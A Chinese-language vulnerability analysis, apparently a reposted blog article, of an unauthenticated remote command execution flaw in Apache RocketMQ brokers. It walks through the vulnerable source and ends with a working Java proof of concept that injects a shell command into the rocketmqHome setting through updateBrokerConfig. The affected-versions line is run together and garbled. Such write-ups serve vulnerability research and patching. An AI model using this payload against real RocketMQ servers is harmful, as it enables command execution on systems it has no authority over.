<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/1GIATpldq29cVTR6Rw_DTw)

一、漏洞描述
======

RocketMQ 5.1.0 及以下版本，在一定条件下，存在远程命令执行风险。RocketMQ 的 NameServer、Broker、Controller 等多个组件外网泄露，缺乏权限验证，攻击者可以利用该漏洞利用更新配置功能以 RocketMQ 运行的系统用户身份执行命令。 此外，攻击者可以通过伪造 RocketMQ 协议内容来达到同样的效果。

二、影响版本
======

5.0.0 <= Apache RocketMQ < 5.1.14.0.0 <= Apache RocketMQ < 4.9.6

三、漏洞详情
======

github 地址：https://github.com/apache/rocketmq/releases 下载后若通过源码启动 RocketMQ，idea 需设置 ROCKETMQ_HOME（先启动 NamesrvStartup，再启动 BrokerStartup）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/3LFWic4c794AibdlaPSQGYsem5fhANptmqgHSf0RciaibKiaArYibYTtmzpsjqcQCiaCia9qHEuiaYDwkBFJga1LriaQNtRQ/640?wx_fmt=png)

1、源码解析
------

org/apache/rocketmq/broker/BrokerStartup.java 为启用类，源码如下：

```
//main 方法
public static void main(String[] args) {
       //调用至start()
       start(createBrokerController(args));
}


public static BrokerController start(BrokerController controller) {
   try {
       //调用至BrokerController#start()
       controller.start();

       String tip = String.format("The broker[%s, %s] boot success. serializeType=%s",
           controller.getBrokerConfig().getBrokerName(), controller.getBrokerAddr(),
           RemotingCommand.getSerializeTypeConfigInThisServer());

       if (null != controller.getBrokerConfig().getNamesrvAddr()) {
           tip += " and name server is " + controller.getBrokerConfig().getNamesrvAddr();
      }

       log.info(tip);
       System.out.printf("%s%n", tip);
       return controller;
  } catch (Throwable e) {
       e.printStackTrace();
       System.exit(-1);
  }

   return null;
}

```

BrokerController#start()

```
public void start() throws Exception {

   this.shouldStartTime = System.currentTimeMillis() + messageStoreConfig.getDisappearTimeAfterStart();

   if (messageStoreConfig.getTotalReplicas() > 1 && this.brokerConfig.isEnableSlaveActingMaster() || this.brokerConfig.isEnableControllerMode()) {
       isIsolated = true;
  }

   if (this.brokerOuterAPI != null) {
       this.brokerOuterAPI.start();
  }
//调用至startBasicService()
   startBasicService();

   if (!isIsolated && !this.messageStoreConfig.isEnableDLegerCommitLog() && !this.messageStoreConfig.isDuplicationEnable()) {
       changeSpecialServiceStatus(this.brokerConfig.getBrokerId() == MixAll.MASTER_ID);
       this.registerBrokerAll(true, false, true);
  }
....

```

BrokerController#startBasicService()

```
protected void startBasicService() throws Exception {
...
   if (this.filterServerManager != null) {
       //调用至FilterServerManager#start()
       this.filterServerManager.start();
  }

   if (this.brokerStatsManager != null) {
       this.brokerStatsManager.start();
  }
....

```

FilterServerManager#start()

```
public void start() {
//定时周期执行指定任务
   //任务：FilterServerManager.this.createFilterServer();
   //初始化延时:1000 * 5
   //两次开始执行最小间隔时间:1000 * 30
   //计时单位：TimeUnit.MILLISECONDS 毫秒
   this.scheduledExecutorService.scheduleAtFixedRate(new AbstractBrokerRunnable(brokerController.getBrokerConfig()) {
       @Override
       public void run0() {
           try {
               FilterServerManager.this.createFilterServer();
          } catch (Exception e) {
               log.error("", e);
          }
      }
  }, 1000 * 5, 1000 * 30, TimeUnit.MILLISECONDS);
}

public void createFilterServer() {
   //filterServerNums默认为0
   //filterServerTable.size() 默认为0
   //more 默认为0
   int more =
       this.brokerController.getBrokerConfig().getFilterServerNums() - this.filterServerTable.size();
   //获取cmd,此处cmd 部分可控
   String cmd = this.buildStartCommand();
   //more 默认为0不进入循环，若要执行cmd 则more 不为0，即通过配置修改使filterServerNums不为0
   for (int i = 0; i < more; i++) {
       //执行 cmd
       FilterServerUtil.callShell(cmd, log);
  }
}


private String buildStartCommand() {
   String config = "";
   //默认为空 不进入此if
   //此处可未授权添加配置控制此处
   if (BrokerStartup.CONFIG_FILE_HELPER.getFile() != null) {
       config = String.format("-c %s", BrokerStartup.CONFIG_FILE_HELPER.getFile());
  }

   //获取 this.brokerController.config 中 NamesrvAddr 设置为config变量值进而拼接 cmd 中
   //此处可未授权添加配置即此处可控
   if (this.brokerController.getBrokerConfig().getNamesrvAddr() != null) {
       config += String.format(" -n %s", this.brokerController.getBrokerConfig().getNamesrvAddr());
  }

   //获取 this.brokerController.config 中 RocketmqHome 拼接到 cmd 中
   //若为 windows 则为 start /b ...
   //非 windows 则为 sh ...
   if (NetworkUtil.isWindowsPlatform()) {
       return String.format("start /b %s\\bin\\mqfiltersrv.exe %s",
           this.brokerController.getBrokerConfig().getRocketmqHome(),
           config);
  } else {
       return String.format("sh %s/bin/startfsrv.sh %s",
           this.brokerController.getBrokerConfig().getRocketmqHome(),
           config);
  }
}

```

FilterServerUtil#callShell()

```
public class FilterServerUtil {
   public static void callShell(final String shellString, final Logger log) {
       Process process = null;
       try {
           //传入 cmd 以空格分隔为数组
           String[] cmdArray = splitShellString(shellString);
           //命令执行
           process = Runtime.getRuntime().exec(cmdArray);
           process.waitFor();
           log.info("CallShell: <{}> OK", shellString);
      } catch (Throwable e) {
           log.error("CallShell: readLine IOException, {}", shellString, e);
      } finally {
           if (null != process)
               process.destroy();
      }
  }

   private static String[] splitShellString(final String shellString) {
       return shellString.split(" ");
  }
}

```

<a ></a>

2、漏洞利用
------

综上：1、系统默认 30 秒执行一次 `FilterServerManager#createFilterServer()`2、`FilterServerManager#createFilterServer()`中存在命令执行行为 3、可通过未授权修改配置控制要执行的命令, 分为以下两种情况：windows：`start /b ${1}\\bin\\mqfiltersrv.exe -c ${2} -n ${3}`非 windows:`sh ${1}/bin/startfsrv.sh -c ${2} -n ${3}`1、2、3 三出均可通过配置文件控制。<a ></a>

### payload

```
import java.util.Properties;
import org.apache.rocketmq.tools.admin.DefaultMQAdminExt;

public static void main(String[] args) {
       // 创建 Properties 对象
       Properties props = new Properties();
       //修改rocketmqHome配置
       props.setProperty("rocketmqHome","-c $@|sh . echo open -a Calculator;");
       props.setProperty("filterServerNums","1");
       // 创建 DefaultMQAdminExt 对象并启动
       DefaultMQAdminExt admin = new DefaultMQAdminExt();
       //此处为 namesrv 端口,此端口无需可访问
       admin.setNamesrvAddr("localhost:9876");
       admin.start();
       // 更新配置⽂件
       //此处为 broker 端口，必须可访问
       admin.updateBrokerConfig("127.0.0.1:10911", props);
       // 关闭 DefaultMQAdminExt 对象
       admin.shutdown();
}

```